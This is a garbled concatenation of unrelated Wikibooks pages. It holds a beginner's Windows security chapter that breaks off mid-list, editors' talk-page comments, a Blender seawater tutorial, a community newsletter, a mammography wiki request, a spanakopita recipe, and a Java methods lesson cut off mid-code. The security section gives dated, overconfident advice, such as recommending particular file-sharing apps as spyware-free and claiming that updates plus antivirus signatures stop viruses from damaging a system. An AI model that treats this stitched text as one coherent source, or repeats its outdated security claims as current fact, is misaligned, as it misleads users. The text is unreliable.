In Windows, a problem often arises when a program needs to have administrative privileges to run. In this case, you can run the program as administrator. In windows operating systems, this is done by right clicking the program to run, selecting 'run as administrator account, and typing in the administrator account's information. If that doesn't work, you can always login to the administrators account to run the program, but be wary of running any other programs while in that account, especially programs that access the Internet like web browsers, chat programs, or e-mail programs. 

Sometimes, damaging programs can infect non-administrator accounts. If this happens, these programs are usually limited to the that specific user account. Deleting that user account usually solves the problem. There are viruses sophisticated enough to infect the entire computer from a non-administrator account; however, if you keep your computer up to date with Windows Update and always download the signatures for your Anti-Virus software vulnerabilities in your computer will be closed and the virus cannot damage the system.

You wouldn't hand out a key that could open everything in your house to anyone who asked, so why would you hand out administrative account to anyone? If you really want to protect your data, do not give out your administrator password or account to untrusted people. If other people want to use your computer, it is a good idea to create a general guest account without administrative privileges for them to use. If they use it often, creating a new user for them is also an option.

=Physical Access=
If a person has physical access to the computer, there are a few measures that can be taken to prevent damage to the computer. First, change the settings in your computers BIOS so that it boots first to the hard drive. Booting from the hard drive first ensures that a person cannot boot from a bootable media such as a CD-ROM or floppy disk. Often bootable media contains programs that can crack Windows and change the administrators password. As well, operating system (ex: Windows XP, Linux) installation disks are bootable and often have tools that allow users to erase all the information on the computer.  NOTE:  Do not EVER go into BIOS if you are not 100% sure of what you are doing.  Ask someone who has extensive knowledge to help you.

Next, make it so a user needs a password to change the BIOS settings, this prevents someone from changing the boot order and thus booting from a CD-ROM or floppy disk drive. Last, put a lock on the computer case preventing someone from opening the computer case and resetting the jumper on the motherboard that clears the BIOS boot password.

=Malware=
Malware is a class of software, which usually does harm to a computer, and is unwanted on the computer by its owner. Malware includes viruses, spyware, adware, and trojan horses.

==Anti-Virus==
There are some people who spend their free time writing viruses, programs that do bad things to computers. The threat of getting a virus is high in the digital age of today especially if you are using the Windows operating system. In order to protect your files and everything on your computer, an anti-virus program should be obtained. Anti-virus software is dependent on definitions. Worms can spread through the Internet faster than anti-virus makers can make definitions for them, so you should not protect your self with only anti-virus software.

Here are some good ones:
* [http://www.kaspersky.com/kaspersky_anti-virus Kaspersky Antivirus] Kaspersky is good anti-virus program Available in world. But this is a Commercial Anti virus program.
* [http://free.grisoft.com/freeweb.php/doc/2/ AVG Antivirus] - This is an outstanding free anti-virus program. It is free for personal use only. A more advanced, professional version is available for purchase as well.
* [http://www.avast.com Avast Antivirus] - This is a popular and Anti-virus program
* [http://www.symantec.com/nav/ Norton Anti-Virus] - This is probably the most popular commercial anti-virus. A good choice.
* [http://us.mcafee.com/ McAfee VirusScan] - A competitor to Norton Anti-Virus. This one is also a good choice.
* [http://www.eset.com NOD32] - This is one of the top anti-virus scanners based on tests conducted by [https://www.icsalabs.com/icsa/icsahome.php ISCA Labs]. Although it isn't as well known as Norton and McAfee, it still provides an excellent degree of protection along with a faster scanning rate than most other Anti-Virus applications.
* [http://www.trendmicro.com/en/home/us/personal.htm TrendMicro PC-Cillin] - This is also a good choice and has been around for many years.
Make sure that you set up your anti-virus program to update its virus definitions at least every week, or you'll get lost in the dust.  If possible set up your anti-virus program to update every day because new viruses are always emerging.  To get an idea of how quickly things change you can look at any of the sites listed above and they will list the current top virus threats.

===Worms===
Worms are a type of virus that spread automatically through the internet, through exploits in a running service. Examples are Nimda and Msblaster. These can easily be blocked using a firewall, or making sure the services and your Operating System are up-to-date. Doing these can be especially important, because worms can spread faster than anti-virus software can be created, and often don't need any use interaction in order to install.

==Spyware and Adware Blocker==

Much of the free software available is not able to remove all spyware and adware. 

Spyware and Adware are similar to viruses, except that they don't spread on their own, but can be installed without your knowledge. They are more annoying and can be just as harmful. 

Spyware's main motive is to get personal information of whoever is using the computer and send it to a company.
Adware is enhanced spyware. It uses the information that it collects to show you advertisements on your computer screen. Adware can be received the same ways as spyware.

There are some good free spyware and adware blockers.
* '''[http://spybot.info/ Spybot - Search &amp; Destroy]'''
* '''[http://www.lavasoftusa.com/ Ad-Aware]'''
* '''[http://www.microsoft.com/athome/security/spyware/software/default.mspx/ Windows Defender]'''
Together, these make a good defense against evil programs.

There are also commercial spyware and adware blockers. The major companies that make anti-virus software have been including spyware/adware detection with their products in recent years.

==Common Spyware Infestation Methods and Prevention==
A lot of spyware can be prevented. A few simple steps can save you from a lot of nightmares later.
====Internet Explorer/ActiveX Exploits====
A common avenue is for spyware to install through ActiveX or an exploit in IE, known as a drive by download. These usually affect IE shells like Avant. To prevent this type of installation, tighten up your IE settings, or use an alternative browser like Firefox. If you don't like Firefox we suggest Javacool's Spyware Blocker as an alterative.

====P2P Apps and other Freeware====
Another way to get spyware is by downloading free programs that are bundled with it. Almost every open source program, however, is spyware and adware free. Avoid programs that are known to contain spyware, especially proprietary file-sharing apps, and instead use one on the second list.

Filesharing apps known to contain spyware:
*Kazaa
*Bearshare
*Morpheus

Filesharing apps known not to contain spyware:
*Ares
*Azureus
*BitTorrent (watch out for &quot;rigged&quot; distributions however)
*eMule
*Limewire (older versions contained some spyware/adware; make sure you have the latest version to avoid this)
*Shareaza

The best places to download freeware without spyware, adware, and malware in them are:
*[http://www.download.com download.com]
*[http://www.fileplanet.com fileplanet.com]
*[http://fileforum.betanews.com/ betanews.com]
*[http://www.softpedia.com softpedia.com]
*[http://www.sourceforge.net sourceforge.net]
*[http://www.pcworld.com pcworld.com]

=Firewall=
A firewall protects your computer by blocking certain network packets. They come in different flavors. Even if you are sent a packet that contains an exploit that is unpatched, a firewall can block the packet.

==NAT Firewall==
A NAT Firewall is used in routers. It maps one public IP address to multiple private IP addresses. This will make your whole network appear to be one computer. By default, unsolicited (inbound) packets are dropped, giving you basic firewall protection. Many routers offer more advanced firewall features. By default, any servers run behind the NAT (Network Address Translation) will only be accessible from your LAN (Local Area Network). Port forwarding can be used so that a server can be accessed from the Internet.

==Software Firewall==
A software firewall runs on the client computer. They're also known as personal firewalls. (This can refer to any firewall that only protects one computer like the firewall built into some nForce chipsets.) Because it runs on your computer, it can block or allow traffic depending on the application. For this reason, many people run software firewalls in addition to a hardware firewall. Hardware firewalls are harder to configure for new computer users so software firewalls are more common. However, software firewalls take up resources on the host computer. Windows XP and above comes with a basic firewall that prevents inbound attacks, while allowing other programs to access the Internet.

We suggest:

      <text xml:space="preserve">&quot;Also, the computer shouldn't be sitting directly on carpet, as this may create static electricity and short out your components.&quot;

Is this true?  Sounds kind of hokey to me.  Computers are well-grounded so if you want to protect it from static electricity you need to ground yourself, not the computer (you're the one moving and thus the one getting charged).  Besides, unless the computer is actually open and there is a risk of touching the inside components, any static would go through the grounded case and thus not be an issue.  I would take this sentence out since it's just going to scare people who are already unsure of themselves around computers.

I read one time in a Dell Manual not to put the computer directly on carpet, which is why I included it. Better be safe than sorry, right? --[[User:Kram|Kram]] 18:55, 27 Mar 2005 (UTC)

This is mostly a dust issue. if the computer is on carpet the fan can draw in fibers from the carpet and damage the computer.
-------------------------
&quot;The &quot;escape&quot; key at the top left normally exits a program or stops a task.&quot;

I would change this to something like:
The &quot;escape&quot; key at the top left is rarely used.

There aren't many programs that use Escape to exit and so saying this early on might lead people to try to close programs using the Escape key and being confused when it doesn't work.

To whoever wrote this: If you want to add that than go right ahead. It's only deleting content that really needs to be discussed. --[[User:Kram|Kram]] 18:55, 27 Mar 2005 (UTC)

== Is this worth it? ==

Is there a reason for Computers for Beginners/The Basics being on wikibooks? Who is going to use it? Anyone who can find it on wikibooks is going to know everything here. Can someone offer their opinion about this?
(perhaps that's why no one has done much here) [[User:Gavintlgold|Gavin]] 12:15, 22 October 2006 (UTC)

=== Yes, it's worth it ===
I'm trying to teach my grandmother basic computing. I can print this out and show it to her. #[[User:Peteturtle|Brandon Johnsonn]] 12:41, 15 May 2007 (UTC)

== Linux OS???? ==

Ok. Who's been calling Linux &quot;Linux OS&quot;?

Mac OS I understand, but Linux is a name of its own! It's like Windoze... sorry. Windows. You wouldn't call it &quot;Windows OS&quot; even though it IS an OS. People have to understand that the OS suffix is part of the name, and you can't just randomly add it on.

: [''ed. note: Need a much more basic introduction to what materials, textures, maps, and all the accompanying terms are with illustrative examples before diving into a specific sea-water example.  Much more effective learning when you know what you're changing.'']

[[File:Sea-water-setting.gif|thumb|350px|Settings for the seawater material]]
75% of the Earth's surface is covered with water. In homage to this great fact, we will develop your materials skills first by creating basic seawater.

== Create 3 linked planes ==
First we create a new file in Blender and delete the default cube by pressing '''XKEY''' and confirming the popup dialog. Now switch to top view with '''NUM7''' and enter '''SPACE &gt; Add &gt; Mesh &gt; Plane''' to create a plane. Then scale it up to 20 its original size with the '''SKEY''' the way you've already learned in one of the earlier tutorials. Go to the side view with '''NUM3''' and duplicate this plane ''two more times'' using '''Alt-D''' (not Shift-D), moving the plane down on the Z axis by two grid spaces each duplicate. This will make the transparency of the water more realistic once we set it. Using Alt-D rather than Shift-D makes a linked duplicate, so that the changes we make to one plane effect the other two.

== Create material ==
Now off to the actual texturing work. Select any one of the planes and press '''F5''' to bring up the Material Buttons in the Buttons Window. You will probably find two new small windows appearing here: one called Links and Pipelines and the other one Preview.

('''Noob note:''' A new section has been added for Blender 2.63 users after this section.)

Click the 'Add New' button in the 'Links and Pipelines' tab to create a new material named `Material.001' or so. To make life easier we'll rename it to something meaningful like 'Seawater' by simply clicking it and typing in the letters, as shown here (SHIFT+DELETE in field to clear):

Now, on the same tab, give the seawater material a color of RGB (0.100, 0.310, 0.435). Find the tab that reads 'Mirror Transp' and click it. Click on 'Ray Mirror' and 'Ray Transp'. For the &quot;Ray Mirror&quot; box, move the 'RayMir' slider to 0.3, the 'Fresnel' slider to 2.5 and the Depth to 5. For the 'Ray Transp' box, move the 'IOR' slider to 1.33, the 'Fresnel' slider to 2.0 and the Depth to 5. This will give the water realistic transparency and reflection. Also click the 'Shaders' tab, change 'CookTorr' to 'Blinn', move 'Spec' to 2.000, 'Hard' to 180 and 'Refr' to 10.000. This will make the water look more glossy.

Now we'll add a procedural texture to our seawater, which will give it a &quot;wavy&quot; look. Click the Texture button (looks like bricks) or press '''F6''' to view the texture buttons subcontext. Click on the knob to the left of the texture name and select the &quot;Add New&quot; button. This creates a new texture named &quot;Tex.001&quot; or so. Click on the name and change it to &quot;Waves&quot;.

Go to the Texture Type pull-down ('''F6''') and select 'Clouds'. On the Clouds tab change 'NoiseSize' to 0.050. Our Waves texture is ready; next, we will refine how it is applied to our Seawater material.

Noise Size increases the size of the noise, in this case, the clouds. Soft Noise blends the intensities and reduces the contrast. Makes a mellow effect, like soft waves. Hard noise creates a high contrast, and brings out individual 'shapes'.

If you want to add more detail to your water, add another texture and rename it to &quot;LargeWaves&quot;. Make it a cloud texture like the previous one, but make it's 'NoiseSize' 0.300 and use 'Hard noise'.

[[Image:Blender-seawater.png|thumb|350px|The final rendered image]]
Left click on the Materials button (looks like a red sphere) to return to the material buttons subcontext. Look at the Texture panel, and you'll see that the &quot;Waves&quot; texture has been automatically associated with the Seawater material.

Select the 'Map To' tab. Click the 'Nor' and 'Spec' buttons so they're selected and have white text (the white text indicates a positive mapping). Click the 'Hard' button twice so it's selected and has yellow text (the yellow text indicates a negative mapping). Click the 'Col' button so it is not selected, this button will show any color in the texture which we do not want. Find the 'Nor' Slider and move its value to about 5.00.

If you created the &quot;LargeWaves&quot; texture, select the &quot;LargeWaves&quot; texture under 'Texture and Input', go to the 'MapTo' tab, deselect 'Col', select 'Nor' and move the 'Nor' slider to 7.00. Do not select 'Hard' or 'Spec' this time.

For lighting press '''Space &gt; Add &gt; Lamp &gt; Sun'''. You shouldn't need to move the sun or change any of its settings. Finally move the camera to the edge of the plain and move it up towards the sky a bit.

Go to the Scene tab ('''F10'''), and look for the six buttons next to the big render button. Deselect all these, leaving only the 'Ray' button selected. This will tell Blender not to render some features in our scene that we really don't need. Go and press '''F12''' to render the water, it may take a while depending on your system.

Admire your water, and maybe drink a tall glass of something refreshing!

== Create Material / Textures (Blender 2.63) ==


'''Material'''
* Go to the properties window (Bottom right window by default) and click on the Material tab
* Click of the + symbol to create a new material and name it Seawater
* Click on the diffuse color box and give it a seawater blue RGB (0.100, 0.310, 0.435)
* Enable the Mirror checkbox
* In the Mirror section, set Reflectivity: 0.3, Fresnel: 2.5 and Depth: 5
* Enable the Transparency checkbox
* In the Transparency section, click the Raytrace button
* Also in the Transparency section, set IOR: 1.33, Fresnel: 2 and Depth: 5
* In the Specular section, use the pull-down menu to change CookTorr to Blinn, then set Intensity: 1, Hardness: 180 and IOR: 10


'''Textures'''
* Still in the Properties window, click on the Textures tab
* Click on the “+ New” button to create a new texture and name it Waves
* Set the Type: Clouds using the pull-down menu
* In the Clouds section, set Size: 0.05 to create soft noise
* In the Influence section, uncheck Color under Diffuse, then under Specular, check the &quot;Specular&quot; box and “Hardness” box then set the value to Hardness: -1.  Under Geometry, check the “Normal” box and set the value to Normal: 5
* Select the second line in the Textures list and create a second Texture using the “+ New” button. Name it LargeWaves
* Set the Type to clouds again, but this time, set Size: 0.3 in the Clouds section and click on the &quot;Hard&quot; button for hard noise
* Deselect “Color” and under Geometry, select the “Normal” box and set the value to Normal: 7


'''Lighting'''
* In object mode, select the default lamp (if present) and delete it
* Create a new lamp by pressing ALT+A and selecting Lamp --&gt; Sun
* Place the Sun in the sky by moving it up the Z-axis.  Press G, Z, 20 and hit ENTER
* Go back to the Properties window and click on the World tab
* Click on the box under Horizon Color and set the color to RGB (0.242, 0.617, 0.831) for sky blue
* Position the camera to be looking over the water with some sky visible and render your scene.
*How about using what we have learned in previous modules to add some dolphins swimming just below the surface?

:I think some more good touches can easily be put on before april. I'll be trying to do a bit of &quot;last minute editing&quot; and such myself if this ends up getting it. I'm also planning on either finding or opening up my computer and taking a suitable picture myself.--[[User:Hyperlink|Hyperlink]] 08:55, 23 Mar 2005 (UTC)
::I think some expansion is direly needed, especially on the actual building part. I can work on this during my spring break, which is in a couple of weeks.

== Deleting Pages ==

I see that you removed the redirect from [[Radiation Oncology:SCLC]] since it wasn't needed (and no pages linked to it) but the page itself wasn't actually deleted. This leaves an [[Special:Lonelypages|orphan]], and is something I've been trying to clean up recently. I've marked the page with a speedy delete tag ( {{tl|delete}} ) so that it doesn't clutter things up, but please try to follow this in the future: It makes everyone's job easier. --[[User:Xerol|Xerol Oplan]] 00:35, 7 April 2006 (UTC)


==Author Contributions==
*Just to give you heads up, I added &quot;edit counts&quot; to each author. I looked it up since I was curious about who contributed what where. And I want to say you have done a great job to get this thing off the ground! You deserve the credit not just for &quot;original concept&quot; but for all the work as well. I plan on expanding/updating/editing as appropriate, as I have time and energy. [[User:Tdvorak|Tdvorak]] 00:23, 13 September 2006 (UTC)
*[reply] Thanks! As for my &quot;edit velocity&quot;, the first 6 months (late 2005) I had time off, so had plenty of time to play around. Now I started my residency, so I suspect the velocity will drop off. But I do find it helpful as a study aid. Overall, I think the format works well. I have heard few people mention it, who had no idea I was contributing. So there is definitely &quot;some&quot; awareness out there :) [[User:Tdvorak|Tdvorak]] 00:53, 13 September 2006 (UTC)

This is a short newsletter that is being distributed to all active wikibookians.  You are getting this message because you are recognized as an established contributor to the project.  This newsletter will be distributed on a regular basis to help share news, information, and tips. It comes from a bot account, [[User:The Staff]]. [[User:The Staff]] is currently operated by a team of wikibooks admins, the complete list of which is available on the user page of the bot. If you would like to not receive this newletter anymore, please remove your name from the list at [[Wikibooks:Active wikibookians]].

The work you do at Wikibooks is greatly appreciated.  However there are plenty of other opportunities for you to get involved and help us to create a thriving Wikibooks community.
We are sure that there are things we can do to help you and your understanding of Wikibooks and similarly there are certainly things you could do to help Wikibooks become a better place.

We would like to ask all wikibookians to add the [[WB:BB|Bulletin Board]] to your watchlists.  The Bulletin Board is a fast and easy way for wikibookians to communicate important news and events to the entire community. If you have important news to share with the community, you can feel free to add your own entry to that page.

If you have general questions or comments about Wikibooks, you are welcome to post a message on [[WB:SL|The Staff Lounge]], a free discussion area.  Your input would also be welcomed in the [[WB:VFD|Votes for Deletion]] and [[WB:RFA|Requests for Adminship]] discussion pages. These pages are all active discussion areas that help to shape the Wikibooks community as a whole.

Sometimes it is easy to forget that the Wikibooks community is much larger and more diverse then the people who work in a single book, or on a single bookshelf. Hopefully, together we can all make Wikibooks a better place, and a more valuable educational resource.

The purpose of this wiki and this group is to provide a place for mammography professionals, and others interested to collaborate in the advancement of mammography as a tool in breast disease detection, especially breast cancer.  
I would like to add a sub-page to the radiology section on mammography, but am unsure where it should be put.  The intent of the page would be to give individuals a place to build content in this subject area, in order to improve the clinical applications of this technique (breast imaging) and advance it.  The overall goal of the group, the wiki, and the book would be to build a collaborative community for the study of, use of, and research in mammography.  
I am requesting that the authors in the radiology category create this page in order to maintain the hierarchy of information content as they see fit.  I would like to see this page then opened for content editing.
Please post any comments to the google group.
Thank you

'''Spanakopita''' is a [[Cookbook:Cuisine of Greece|Greek]] ''spinach pie''. This recipe serves 8.
[[Image:Spanokopita_cropped.jpg|right|thumb|250 px|a slice of Spanakopita.]]

==Ingredients==
*900 [[Cookbook:Gram|g]] (2 [[Cookbook:Pound|lbs.]]) fresh [[Cookbook:Spinach|spinach]] or 580g (20oz) frozen, thawed, and drained
*1 large [[Cookbook:Onion|onion]], finely chopped
*¼ [[Cookbook:Cup|cup]] extra virgin [[Cookbook:Olive Oil|olive oil]]
*1 cup [[Cookbook:Chopping|chopped]] [[Cookbook:Green onion|scallions]]
*½ cup [[Cookbook:Mincing|minced]] fresh [[Cookbook:Parsley|parsley]]
*1 [[Cookbook:Tablespoon|Tbsp.]]   minced fresh [[Cookbook:Dill|dill]]
*¼ [[Cookbook:Teaspoon|tsp.]] freshly ground [[Cookbook:Nutmeg|nutmeg]]
*1 Tbsp. [[Cookbook:Lemon Juice|lemon juice]]
*¾ cup crumbled [[Cookbook:Feta Cheese|feta cheese]]
*¾ cup small curd [[Cookbook:Cottage Cheese|cottage cheese]]
*¼ cup freshly grated [[Cookbook:Parmesan Cheese|parmesan cheese]]
*4 [[Cookbook:Egg|eggs]], beaten
*12-20 sheets [[Cookbook:Phyllo dough|phyllo pastry]]
*⅔ cup [[Cookbook:Ghee|clarified butter]]
*¼ tsp. freshly ground black pepper
*½ tsp. salt (or to taste)

==Procedure==
# Preheat oven to 180°C (350° F).
# Wash the spinach, remove large stems, and chop. Place in a steamer over boiling water and steam for 2 minutes, or until wilted and reduced in volume. Drain, pressing out any liquid with the back of a spoon.
# Heat the oil in a large skillet. Add onions and cook over medium heat until slightly tender. Add scallions and cook until limp. Remove from heat. Stir in parsley, dill, nutmeg, salt and pepper.
# Add the cheeses, spinach, and lemon juice to the skillet. Mix. Add eggs and mix again gently.
# Brush a 9&quot;x12&quot; baking dish with some of the butter. Lay a sheet of phyllo dough across the bottom of the dish, covering the entire surface and letting the edges fold upward against the sides. Brush with butter, and place another sheet on top. Continue layering the phyllo (brushing each sheet) until the bottom of the dish is covered with about 8 sheets.
# Place half of the spinach filling on top of the phyllo, smoothing out with a rubber spatula until evenly distributed.
# Cover the filling with 5-8 phyllo sheets, brushing each layer with butter. Place remaining spinach filling on top and smooth as above.
# Cover with 5-8 phyllo sheets, brushing with butter as above. Roll up all overhanging phyllo sheets and crumble any broken sheet bits on top. Drizzle any remaining clarified butter over top.
# Place the spanakopita in the oven on a medium rack. Bake for 45 minutes, or until puffed and golden. Let sit for 10 minutes before cutting and serving.

==Notes==
* I usually double or triple this recipe and make 2 huge baking dishes. This is just as fabulous as a leftover.
* Instead of phyllo pastry, my Greek mother-in-law taught me to use pizza dough purchased from the supermarket dairy section as a quick and delicious alternative.
* Please note that phyllo pastry has fewer calories than other doughs.

{{Programming/Navigation|lang=Java|previous=Literals|next=API/java.lang.String}}
{{Java Programming/LanguageFundamentalsTopic/Nav}}
__NOTOC__&lt;/noinclude&gt;

''Methods'' are how we communicate with objects. When we invoke or call a method we are asking the object to carry out a task. We can say methods implement the behaviour of objects. For each method we need to give a name, we need to define its input parameters and we need to define its return type. We also need to set its [[Java Programming/Scope|visibility]] (private, protected or public). If the method throws an Exception, that needs to be declared as well. It is called a ''method definition''. The syntax of method definition is:
{{java:class}} MyClass {
  ...
  {{java:public}} ReturnType '''methodName'''(ParamOneType parameter1,
              ParamTwoType parameter2)
    {{java:throws}} ExceptionName {
      ReturnType returnType;
      ...
      {{java:return}} returnType;
    }
  ...
}

We can declare that the method does not return anything using the {{java:void}} Java keyword. For example:

{{XExample|1=&lt;span id=&quot;code-section-67&quot;&gt;'''Code section 3.67: Method without returned data.'''&lt;/span&gt;
&lt;syntaxhighlight lang=&quot;Java5&quot; line start=&quot;1&quot;&gt;
private void methodName(String parameter1, String parameter2) {
  ...
  return;
}
&lt;/syntaxhighlight&gt;}}

When the method returns nothing, the {{java:return}} keyword at the end of the method is optional. When the execution flow reaches the {{java:return}} keyword, the method execution is stopped and the execution flow returns to the caller method. The {{java:return}} keyword can be used anywhere in the method as long as there is a way to execute the instructions below:

{{XWarning|1=&lt;span id=&quot;code-section-68&quot; style=&quot;color: red;&quot;&gt;'''Code section 3.68: {{java:return}} keyword location.'''&lt;/span&gt;
&lt;syntaxhighlight lang=&quot;Java5&quot; line start=&quot;1&quot; highlight=&quot;5, 8&quot;&gt;
private void aMethod(int a, int b) {
  int c = 0;
  if (a &gt; 0) {
    c = a;
    return;
  }
  int c = c + b;
  return;
  int c = c * 2;
}
&lt;/syntaxhighlight&gt;}}

In the [[#code-section-68|code section 3.68]], the {{java:return}} keyword at line 5 is well placed because the instructions below can be reached when &lt;code&gt;a&lt;/code&gt; is negative or equal to 0. However, the {{java:return}} keyword at line 8 is badly placed because the instructions below can't be reached.

{{Java/Hidden begin|title=Test your knowledge}}
'''Question 3.9''': Consider the following code:

{{XExample|1=&lt;span id=&quot;question-9&quot;&gt;'''Question 3.9: Compiler error.'''&lt;/span&gt;
&lt;syntaxhighlight lang=&quot;Java5&quot; line start=&quot;1&quot;&gt;
private int myMethod(int a, int b, boolean c) {
  b = b + 2;
  if (a &gt; 0) {
    a = a + b;
    return a;
  } else {
    a = 0;
  }
}
&lt;/syntaxhighlight&gt;}}

The code above will return a compiler error. Why?
{{Java/Hidden begin|title=Answer}}
{{XExample|1=&lt;span id=&quot;answer-9&quot;&gt;Answer 3.9: Compiler error.'''&lt;/span&gt;
&lt;syntaxhighlight lang=&quot;Java5&quot; line start=&quot;1&quot; highlight=&quot;1, 7&quot;&gt;
private int myMethod(int a, int b, boolean c) {
  b = b + 2;
  if (a &gt; 0) {
    a = a + b;
    return a;
  } else {
    a = 0;
  }
}
&lt;/syntaxhighlight&gt;}}
The method is supposed to return a {{java:int}} but when &lt;code&gt;a&lt;/code&gt; is negative or equal to 0, it returns nothing.

== Parameter passing ==

We can pass any [[Java Programming/Primitive Types|primitive data types]] or objects to a method but the two are not processed the same way.

=== Primitive type parameter ===

The primitive types are ''passed in by value''. It means that as soon as the primitive type is passed in, there is no more link between the value inside the method and the source variable:

{{XExample|1=&lt;span id=&quot;code-section-69&quot;&gt;'''Code section 3.69: A method modifying a variable.'''&lt;/span&gt;
&lt;syntaxhighlight lang=&quot;Java5&quot; line start=&quot;1&quot;&gt;
private void modifyValue(int number) {
  number += 1;
}
&lt;/syntaxhighlight&gt;}}

{| style=&quot;width: 100%;&quot;
|valign=&quot;top&quot;|{{XExample|1=&lt;span id=&quot;code-section-70&quot;&gt;'''Code section 3.70: Parameter by value.'''&lt;/span&gt;
&lt;syntaxhighlight lang=&quot;Java5&quot; line start=&quot;1&quot; highlight=&quot;2&quot;&gt;
int i = 0;
modifyValue(i);
System.out.println(i);
&lt;/syntaxhighlight&gt;}}
|valign=&quot;top&quot;|{{XConsole|1='''Output for Code section 3.70'''
&lt;pre style=&quot;background-color:#000; color:#fff;&quot;&gt;
0  
&lt;/pre&gt;}}
|}

As you can see in [[#code-section-70|code section 3.70]], the &lt;code&gt;modifyValue()&lt;/code&gt; method has not modified the value of &lt;code&gt;i&lt;/code&gt;.

=== Object parameter ===

The object references are passed by value. It means that:
* There is no more link between the reference inside the method and the source reference,
* The source object itself and the object itself inside the method are still the same.

You must understand the difference between the reference of an object and the object itself. A ''object reference'' is the link between a variable name and an instance of object:

{| style=&quot;margin: auto;&quot;
|&lt;code&gt;Object object&lt;/code&gt; ⇔ &lt;code&gt;new Object()&lt;/code&gt;
|}

An object reference is a pointer, an address to the object instance.

The object itself is the value of its attributes inside the object instance:
{| style=&quot;margin: auto;&quot;
|object.firstName
|⇒
|&quot;James&quot;
|-
|object.lastName
|⇒
|&quot;Gosling&quot;
|-
|object.birthDay
|⇒
|&quot;May 19&quot;
|}

Take a look at the example above:
{{XExample|1=&lt;span id=&quot;code-section-71&quot;&gt;'''Code section 3.71: A method modifying an object.'''&lt;/span&gt;
&lt;syntaxhighlight lang=&quot;Java5&quot; line start=&quot;1&quot;&gt;
private void modifyObject(FirstClass anObject) {
  anObject.setName(&quot;Susan&quot;);
}
&lt;/syntaxhighlight&gt;}}

{| style=&quot;width: 100%;&quot;
|valign=&quot;top&quot;|{{XExample|1=&lt;span id=&quot;code-section-72&quot;&gt;'''Code section 3.72: Parameter by reference.'''&lt;/span&gt;
&lt;syntaxhighlight lang=&quot;Java5&quot; line start=&quot;1&quot; highlight=&quot;4&quot;&gt;
FirstClass object = new FirstClass();
object.setName(&quot;Christin&quot;);

modifyObject(object);

System.out.println(object.getName());
&lt;/syntaxhighlight&gt;}}
|valign=&quot;top&quot;|{{XConsole|1='''Output for Code section 3.72'''
&lt;pre style=&quot;background-color:#000; color:#fff;&quot;&gt;
Susan
&lt;/pre&gt;}}
|}

The name has changed because the method has changed the object itself and not the reference. Now take a look at the other example:
{{XExample|1=&lt;span id=&quot;code-section-73&quot;&gt;'''Code section 3.73: A method modifying an object reference.'''&lt;/span&gt;
&lt;syntaxhighlight lang=&quot;Java5&quot; line start=&quot;1&quot;&gt;
private void modifyObject(FirstClass anObject) {
  anObject = new FirstClass();
  anObject.setName(&quot;Susan&quot;);
}
&lt;/syntaxhighlight&gt;}}

{| style=&quot;width: 100%;&quot;
|valign=&quot;top&quot;|{{XExample|1=&lt;span id=&quot;code-section-74&quot;&gt;'''Code section 3.74: Parameter by reference.'''&lt;/span&gt;
&lt;syntaxhighlight lang=&quot;Java5&quot; line start=&quot;1&quot; highlight=&quot;4&quot;&gt;
FirstClass object = new FirstClass();
object.setName(&quot;Christin&quot;);

modifyObject(object);

System.out.println(object.getName());
&lt;/syntaxhighlight&gt;}}
|valign=&quot;top&quot;|{{XConsole|1='''Output for Code section 3.74'''
&lt;pre style=&quot;background-color:#000; color:#fff;&quot;&gt;
Christin
&lt;/pre&gt;}}
|}

The name has not changed because the method has changed the reference and not the object itself. The behavior is the same as if the method was in-lined and the parameters were assigned to new variable names:
{| style=&quot;width: 100%;&quot;
|valign=&quot;top&quot;|{{XExample|1=&lt;span id=&quot;code-section-75&quot;&gt;'''Code section 3.75: In-lined method.'''&lt;/span&gt;
&lt;syntaxhighlight lang=&quot;Java5&quot; line start=&quot;1&quot; highlight=&quot;5-7&quot;&gt;
FirstClass object = new FirstClass();
object.setName(&quot;Christin&quot;);

// Start of the method
FirstClass anObject = object;
anObject = new FirstClass();
anObject.setName(&quot;Susan&quot;);
// End of the method

System.out.println(object.getName());
&lt;/syntaxhighlight&gt;}}
|valign=&quot;top&quot;|{{XConsole|1='''Output for Code section 3.75'''
&lt;pre style=&quot;background-color:#000; color:#fff;&quot;&gt;
Christin
&lt;/pre&gt;}}
|}

== Variable argument list ==
Java SE 5.0 added syntactic support for methods with [http://docs.oracle.com/javase/1.5.0/docs/guide/language/varargs.html variable argument list], which simplifies the typesafe usage of methods requiring a variable number of arguments. Less formally, these parameters are called ''varargs''[http://www.javabeat.net/qna/645-varargs-in-java-50/]. The last parameter can be followed with &lt;code&gt;...&lt;/code&gt;, and Java will box all the arguments into an array. Vararg parameter must always be the last method parameter:

{{XExample|1=&lt;span id=&quot;code-section-76&quot;&gt;'''Code section 3.76: A method using vararg parameters.'''&lt;/span&gt;
&lt;syntaxhighlight lang=&quot;Java5&quot; line start=&quot;1&quot; highlight=&quot;1&quot;&gt;
public void drawPolygon(java.awt.Point... points) {
  //…
}
&lt;/syntaxhighlight&gt;}}

When calling the method, a programmer can simply separate the points by commas, without having to explicitly create an [[Java Programming/Arrays|array]] of &lt;code&gt;Point&lt;/code&gt; objects. Within the method, the points can be referenced as &lt;code&gt;points[0]&lt;/code&gt;, &lt;code&gt;points[1]&lt;/code&gt;, etc. If no points are passed, the array has a length of zero. To require the programmer to use a minimum number of parameters, those parameters can be specified before the variable argument:

{{XExample|1=&lt;span id=&quot;code-section-77&quot;&gt;'''Code section 3.77: Variable arguments.'''&lt;/span&gt;
&lt;syntaxhighlight lang=&quot;Java5&quot; line start=&quot;1&quot; highlight=&quot;2&quot;&gt;
// A polygon needs at least three points.
public void drawPolygon(Point p1, Point p2, Point p3, Point... otherPoints) {…}
&lt;/syntaxhighlight&gt;}}

== Return parameter ==
So as we can see, a method may or may not return a value. If the method does not return a value we use the {{java:void}} Java keyword.

Same as the parameter passing, the method can return a primitive type or an object reference. So a method can return only one value. What if you want to return more than one value from a method. You can always pass in an object reference to the method, and let the method modify the object properties. The modified values can be considered as an output value from the method. However you can also create an Object array inside the method, assign the return values and return the array to the caller. You could have a problem however, if you want to mix primitive data types and object references as the output values from the method.

There is a better approach. Defines special return object with the needed return values. Create that object inside the method, assign the values and return the reference to this object. This special object is &quot;bound&quot; to this method and used only for returning values, so do not use a public class. The best way is to use a nested class, see example below:

{{XCode|1=&lt;span id=&quot;code-listing-12&quot;&gt;'''Code listing 3.12: Multiple returned variables.'''&lt;/span&gt;
&lt;syntaxhighlight lang=&quot;Java5&quot; line start=&quot;1&quot; highlight=&quot;37&quot;&gt;
public class MyObject {
  ...
 
  /** Nested object is for return values from getPersonInfoById method */
  public static class ReturnObject {
      private int age;
      private String name;

      public void setAge(int age) {
          this.age = age;
